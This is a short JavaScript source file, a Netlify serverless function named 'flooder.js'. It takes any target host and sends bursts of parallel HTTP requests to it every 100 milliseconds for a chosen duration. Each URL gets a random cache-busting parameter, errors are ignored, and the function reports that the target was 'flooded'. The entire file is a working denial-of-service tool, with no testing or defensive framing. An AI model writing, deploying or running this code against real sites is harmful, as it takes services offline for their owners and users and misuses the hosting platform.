// netlify/functions/flooder.js
const fetch = require('node-fetch');

exports.handler = async function(event) {
  const { target, burstCount, durationMs } = JSON.parse(event.body);

  if (!target || !burstCount || !durationMs) {
    return { statusCode: 400, body: "Missing parameters" };
  }

  const bursts = Math.floor(durationMs / 100); // bursts every 100ms

  // flood function - sends burstCount requests every 100ms for durationMs
  for (let i = 0; i < bursts; i++) {
    // Fire burstCount requests parallel without awaiting individually (fire and forget)
    for (let j = 0; j < burstCount; j++) {
      fetch(`https://${target}/?cachebust=${Date.now()}_${Math.random()}`)
        .catch(() => {}); // ignore errors
    }
    // Wait 100ms between bursts
    await new Promise(res => setTimeout(res, 100));
  }

  return {
    statusCode: 200,
    body: JSON.stringify({ message: `Flooded ${target} with ${burstCount} requests every 100ms for ${durationMs}ms` }),
  };
};
